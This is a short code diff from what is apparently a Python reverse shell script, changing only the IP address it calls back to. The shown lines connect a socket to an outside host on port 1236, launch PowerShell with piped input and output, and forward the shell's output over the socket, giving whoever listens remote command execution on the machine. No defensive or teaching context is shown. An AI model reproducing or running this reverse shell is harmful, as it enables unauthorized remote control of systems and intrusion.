@@ -11,7 +11,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("172.17.141.39",1236))
+s.connect(("172.17.191.172",1236))
 
 p=subprocess.Popen(["pwsh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
